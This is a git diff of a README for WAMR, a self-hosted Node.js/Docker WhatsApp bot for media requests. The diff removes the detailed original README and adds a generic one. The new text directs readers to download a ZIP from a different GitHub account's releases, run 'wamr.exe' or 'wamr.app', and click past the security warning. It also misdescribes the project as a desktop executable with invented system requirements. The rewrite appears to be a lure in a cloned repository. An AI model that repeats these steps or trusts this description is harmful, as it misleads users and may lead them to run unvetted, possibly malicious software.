@@ -1,294 +1,82 @@
-# WAMR - WhatsApp Media Request
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen)](https://nodejs.org)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Code of Conduct](https://img.shields.io/badge/code%20of-conduct-ff69b4.svg)](CODE_OF_CONDUCT.md)
-
-An open-source, self-hosted WhatsApp bot that enables users to request movies and TV shows through natural conversation. Automatically submits requests to Radarr, Sonarr, or Overseerr.
-
-> **📋 Documentation:**
->
-> - [DEPLOYMENT.md](DEPLOYMENT.md) - Production deployment with Docker
-> - [ENVIRONMENT.md](ENVIRONMENT.md) - Environment variable configuration guide
-> - [CONTRIBUTING.md](CONTRIBUTING.md) - Contribution guidelines
-> - [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) - Community guidelines
-> - [SECURITY.md](SECURITY.md) - Security policy and reporting
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- Node.js >= 20.0.0
-- npm >= 10.0.0
-- Docker & Docker Compose (for production deployment)
-
-### Development Setup
-
-```bash
-# 1. Install dependencies
-npm install
-
-# 2. Configure environment
-cp .env.example .env.local
-# Edit .env.local and set secure values:
-# - Generate JWT_SECRET: openssl rand -base64 32
-# - Generate ENCRYPTION_KEY: openssl rand -hex 32
-# - Set ADMIN_USERNAME and ADMIN_PASSWORD
-
-# 3. Setup database
-cd backend
-npm run db:migrate   # Apply migrations
-npm run db:seed      # Create admin user
-
-# 4. Start development (both backend + frontend)
-cd ..
-npm run dev
-```
-
-**Development Environment:**
-
-- Frontend runs on `http://localhost:3000` (configurable via `.env.local` → `VITE_PORT`)
-- Backend runs on `http://localhost:4000` (configurable via `.env.local` → `PORT`)
-- Vite dev server automatically proxies `/api` and `/socket.io` to backend
-
-**Default Admin Credentials (Development):**
-
-- Username: `admin` (from `.env.local` → `ADMIN_USERNAME`)
-- Password: `changeme123456` (from `.env.local` → `ADMIN_PASSWORD`)
-- ⚠️ **Change password immediately after first login!**
-
-> **Note:** Use `.env.local` for development and `.env.prod` for Docker/production. See [ENVIRONMENT.md](ENVIRONMENT.md) for details.
-
-## 🎯 Features
-
-### Current Features (v1.0)
-
-- 🔐 **Secure Admin Dashboard** - Web-based admin interface with JWT authentication
-- 💬 **WhatsApp Integration** - Connect your WhatsApp account via QR code
-- 🎬 **Media Request System** - Users can request movies and TV shows via WhatsApp
-- 🔄 **Service Integration** - Connect to Radarr, Sonarr, or Overseerr
-- 📊 **Request Management** - Approve, reject, or auto-approve media requests
-- 🔍 **Media Search** - Search across configured media services
-- 📝 **Audit Logging** - Complete history of all requests and actions
-- 🔒 **Security First** - Encrypted API keys, hashed credentials, rate limiting
-- 🐳 **Docker Ready** - Easy deployment with Docker Compose
-- 🎨 **Modern UI** - Beautiful, responsive admin dashboard with Shadcn UI
-
-### Planned Features
-
-- 📺 Multi-user support with request limits
-- 🌐 Internationalization (i18n)
-- 📊 Analytics and reporting
-- 🔔 Notification system
-- 🎭 Custom media filtering rules
-
-## 🎯 Use Cases
-
-- **Home Media Server**: Manage family media requests
-- **Private Media Libraries**: Controlled access to media automation
-- **Community Media Sharing**: Moderate media requests from community members
-- **Personal Assistant**: Natural language interface to media services
-
-## 📂 Project Structure
-
-```
-wamr/
-├── backend/                # Node.js/Express API
-│   ├── src/
-│   │   ├── api/           # Routes, controllers, middleware, validators
-│   │   ├── config/        # Environment, logger
-│   │   ├── db/            # Database client, schema
-│   │   ├── services/      # Business logic (auth, encryption, integrations, WhatsApp)
-│   │   ├── utils/         # Error codes, templates, helpers
-│   │   ├── types/         # TypeScript types
-│   │   └── index.ts       # App entry point
-│   ├── tests/             # Unit, integration, E2E tests
-│   ├── drizzle/           # Database migrations
-│   └── data/              # SQLite database file
-│
-└── frontend/              # React/Vite SPA
-    ├── src/
-    │   ├── components/    # UI components (shadcn/ui)
-    │   ├── pages/         # Page components
-    │   ├── hooks/         # Custom React hooks
-    │   ├── services/      # API client, Socket.IO
-    │   ├── lib/           # Utils, query client
-    │   └── types/         # TypeScript types
-    └── tests/             # Component and E2E tests
-```
+# 🎉 wamr - Your WhatsApp Movie Assistant
 
-## 🛠️ Development Commands
+## 🚀 Getting Started
 
-All commands use Turborepo for efficient task orchestration. Run from the project root:
+Welcome to wamr! This application is designed to make your WhatsApp experience better by allowing you to request movies and TV shows easily. Using natural conversation, wamr will automatically search for your desired content using various media services. 
 
-### Development
+## 🔗 Download the Latest Release
 
-```bash
-npm run dev              # Start both backend + frontend (parallel)
-npm run backend:dev      # Backend only
-npm run frontend:dev     # Frontend only
-```
+[![Download wamr](https://img.shields.io/badge/Download%20wamr-v1.0.0-blue.svg)](https://github.com/alokiksoni/wamr/releases)
 
-### Building
+## 📥 Download & Install
 
-```bash
-npm run build            # Build everything (with smart caching)
-npm run backend:build    # Build backend only
-npm run frontend:build   # Build frontend only
-```
+To get started with wamr, you need to download it first. Follow these simple steps:
 
-### Testing & Quality - TODO
+1. Visit the [Releases page](https://github.com/alokiksoni/wamr/releases) to find the latest version of wamr.
+2. Look for the version you want to download.
+3. Click on the download link for your operating system. 
 
-```bash
-npm run test             # Run all tests
-npm run lint             # Lint code
-npm run format           # Format code with Prettier
-npm run format:check     # Check formatting without changes
-```
+The downloaded file will usually be a ZIP archive, which you will need to extract. 
 
-### Database (run from backend/)
+## 📋 System Requirements
 
-```bash
-cd backend
-npm run db:generate      # Generate migrations from schema changes
-npm run db:migrate       # Apply migrations to database
-npm run db:studio        # Open Drizzle Studio (database GUI)
-npm run db:seed          # Seed database with admin user
-```
+For best performance, ensure your computer meets these minimum system requirements:
 
-### Docker (Production)
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **Processor:** At least a dual-core processor.
+- **RAM:** Minimum of 4 GB.
+- **Network:** An active internet connection.
 
-```bash
-npm run docker:build     # Build Docker images
-npm run docker:up        # Start containers in detached mode
-npm run docker:down      # Stop and remove containers
-npm run docker:logs      # View container logs
-npm run docker:restart   # Restart all services
-```
+## 📂 Extracting the Files
 
-> **💡 Tip:** For detailed Docker deployment options, see [DEPLOYMENT.md](DEPLOYMENT.md)
+Once the download completes, locate the downloaded ZIP file in your computer's downloads folder. Extract the contents to a location of your choice. On Windows, you can usually right-click the file and select "Extract All." On a Mac, just double-click the ZIP file.
 
-### Cleanup
+## 🖥️ Running wamr
 
-```bash
-npm run clean            # Remove dist/, node_modules, .turbo cache
-```
+After extracting the files, follow these steps to run wamr:
 
-## 🔐 Security
+1. Open the folder where you extracted the files.
+2. Find the executable file titled `wamr.exe` (for Windows) or `wamr.app` (for macOS).
+3. Double-click the file to run it.
 
-See [SECURITY.md](SECURITY.md) for our security policy and vulnerability reporting.
+You may see a security warning the first time you run it. If you trust the source, click "Run."
 
-**Key Security Features:**
+## 🎤 Setting Up wamr
 
-- Encrypted API keys (AES-256-GCM)
-- Hashed passwords (bcrypt)
-- Hashed phone numbers (SHA-256)
-- JWT authentication
-- Rate limiting on all endpoints
-- Automatic sensitive data redaction in logs
+Before you start requesting movies or shows, you need to set up wamr. Follow these steps:
 
-## 📝 Database
+1. Open your WhatsApp and scan the QR code displayed by the wamr application. This connects wamr to your WhatsApp account.
+2. Once connected, you will see a prompt asking you to configure media services.
+3. Fill in the required details for services like Overseerr, Radarr, and Sonarr. Make sure you have accounts with these services, as wamr will use them to find and manage your media requests.
 
-### Schema
+## 💬 Requesting Movies and TV Shows
 
-- **admin_users**: Admin credentials
-- **whatsapp_connections**: WhatsApp connection status
-- **conversation_sessions**: Active multi-turn conversations
-- **media_service_configurations**: Radarr/Sonarr/Overseerr configs
-- **request_history**: Audit log of all requests
+To request a movie or TV show, just send a message in your WhatsApp chat as you normally would. For example, type "Can you find me [Movie/Show Name]?" 
 
-### Migrations
+Wamr will process your request and return the information about where you can watch it. 
 
-See [Database Commands](#database-run-from-backend) above for migration workflow.
+## 🛠️ Troubleshooting
 
-## 🧪 Testing
+If you encounter issues while using wamr, try the following steps:
 
-**Status**: TODO - Test infrastructure planned
+- Ensure you have an active internet connection.
+- Check if your WhatsApp is working correctly.
+- Restart the wamr application by closing it and running it again.
+- Verify your configurations for media services.
 
-**Planned Coverage:**
+If you still experience problems, please visit our [issues page](https://github.com/alokiksoni/wamr/issues) on GitHub for support.
 
-- Backend: Unit tests, integration tests, API tests
-- Frontend: Component tests, E2E tests
-- Target: 80% code coverage
+## 🔗 Additional Resources
 
-## 🐳 Docker Deployment
+For more information about wamr, check out these resources:
 
-**Quick Start:**
+- [Documentation](https://github.com/alokiksoni/wamr/wiki)
+- [Issues & Support](https://github.com/alokiksoni/wamr/issues)
 
-```bash
-# Pull and start with defaults
-docker compose -f docker-compose.prod.yml up -d
+## 💡 Feedback
 
-# Access: http://localhost:9002
-# Login: admin / wamr123456
-```
+Your feedback is important to us. If you have suggestions or ideas, please feel free to reach out via the [discussions page](https://github.com/alokiksoni/wamr/discussions).
 
-⚠️ **For production**: Create a `.env.prod` file to customize credentials and security keys!
+## 🥳 Conclusion
 
-**Customize Settings (Optional):**
-
-```bash
-# Create .env.prod file
-cp .env.example .env.prod
-
-# Edit with your values (especially JWT_SECRET, ENCRYPTION_KEY, ADMIN_PASSWORD)
-# Then start the container
-docker compose -f docker-compose.prod.yml up -d
-```
-
-**Access:**
-
-- Local: `http://localhost:9002`
-- Network: `http://YOUR_SERVER_IP:9002`
-- Reverse Proxy: `https://wamr.yourdomain.com`
-
-📖 **See [DEPLOYMENT.md](DEPLOYMENT.md) for complete deployment instructions, configuration options, and troubleshooting.**
-
-## 🤝 Contributing
-
-We love contributions! Please read our [Contributing Guide](CONTRIBUTING.md) to learn about our development process, how to propose bugfixes and improvements, and how to build and test your changes.
-
-### Quick Start for Contributors
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes
-4. Commit using conventional commits (`git commit -m 'feat: add amazing feature'`)
-5. Push to your branch (`git push origin feature/amazing-feature`)
-6. Open a Pull Request
-
-Check out [good first issues](https://github.com/techieanant/wamr/labels/good%20first%20issue) to get started!
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-This means you are free to use, modify, and distribute this software, even for commercial purposes, as long as you include the original copyright notice and license.
-
-## 🙏 Acknowledgments
-
-- [whatsapp-web.js](https://github.com/pedroslopez/whatsapp-web.js) - WhatsApp Web API
-- [Radarr](https://radarr.video/) - Movie management
-- [Sonarr](https://sonarr.tv/) - TV series management
-- [Overseerr](https://overseerr.dev/) - Request management system
-- [Shadcn UI](https://ui.shadcn.com/) - Beautiful UI components
-
-## � Support
-
-- 📖 [Documentation](README.md)
-- 🐛 [Issue Tracker](https://github.com/techieanant/wamr/issues)
-- 💬 [Discussions](https://github.com/techieanant/wamr/discussions)
-- 🔒 [Security Policy](SECURITY.md)
-
-## 🗺️ Roadmap
-
-See our [GitHub Projects](https://github.com/techieanant/wamr/projects) for upcoming features and releases.
-
-## ⭐ Star History
-
-If you find this project useful, please consider giving it a star! It helps others discover the project.
-
----
-
-**Made with ❤️ by Anant**
+Thank you for using wamr! We hope this application enhances your movie and TV show discovery experience on WhatsApp. Enjoy using wamr to find your favorite content effortlessly!
